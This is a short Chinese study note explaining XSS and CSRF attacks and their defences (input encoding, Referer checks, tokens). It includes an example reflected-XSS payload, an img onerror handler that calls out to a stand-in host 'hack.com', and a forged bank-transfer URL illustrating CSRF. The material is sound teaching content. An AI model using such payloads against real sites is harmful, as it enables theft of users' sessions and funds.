##web安全

### - xss
> `cross site scripting` 跨站脚本攻击 
>  攻击者往 web 页面插入恶意 Script 代码，  
>  当其他用户浏览该网页时，嵌入的脚本代码就会被执行，从而到达恶意攻击用户的目的

1. 反射型 

> https://www.xxx.com/search?item=<img onerror="new Image().src='//hack.com?c=' src='null'>"
> 很多站点都提供搜索服务，如果把搜索的关键词修改为可执行的javascript语句  
> 服务器不加处理将类似的代码现实到页面  
> XSS代码将会被执行

2. 存储型

> 利用站点本身合法的存储结构，通过站点提供的接口提交XSS代码  
> 会被存储到服务器上 当其他用户访问该网页时，服务器把包含XSS的内容反馈给用户  
> 从而攻击用户

##### 服务器都会将javascript当作文本处理， 在服务端整合进HTML文档中
##### 在浏览器解析这些文本的过程 也就是XSS被执行的时候
##### 所有最主要的防范措施就是 对任何用户提交到服务器上的文本都要经过编码或者转译



### - CSRF
> `cross-site request forgery` 跨站请求伪造  
> 通过伪装来自守信用户的请求来利用  
> 攻击者盗用了你的身份，以你的名义发送恶意请求  

> 我们先假设支付宝存在CSRF漏洞，我的支付宝账号是lyq，攻击者的支付宝账号是xxx。  
> 然后我们通过网页请求的方式 http://zhifubao.com/withdraw?account=lyq&amount=10000&for=lyq2  
> 可以把我账号lyq的10000元转到我的另外一个账号lyq2上去。通常情况下，该请求发送到支付宝服务器后,  
> 服务器会先验证该请求是否来自一个合法的session并且该session的用户已经成功登陆。攻击者在支付吧也有账号xxx， 
> 他知道上文中的URL可以进行转账操作，于是他自己可以发送一个请求 http://zhifubao.com/withdraw?account=lyq&amount=10000&for=xxx 到支付宝后台。  
> 但是这个请求是来自攻击者而不是来自我lyq，所以不能通过安全认证，因此该请求作废。  
> 这时，攻击者xxx想到了用CSRF的方式，他自己做了个黄色网站，在网站中放了如下代码：http://zhifubao.com/withdraw?account=lyq&amount=10000&for=xxx并且通过黄色链接诱使我来访问他的网站。  
> 当我禁不住诱惑时就会点了进去，上述请求就会从我自己的浏览器发送到支付宝，而且这个请求会附带我的浏览器中的cookie。  
> 大多数情况下，该请求会失败，因为支付宝要求我的认证信息，但是我如果刚访问支付宝不久，还没有关闭支付宝页面，  
> 我的浏览器中的cookie存有我的认证信息，这个请求就会得到响应，从我的账户中转10000元到xxx账户里，而我丝毫不知情，攻击者拿到钱后逍遥法外。所以以后一定要克制住自己，不要随便打开别人的链接。

#### CSRF防御错书主要有验证 HTTP Referer 字段，和 添加 token 验证、验证码 




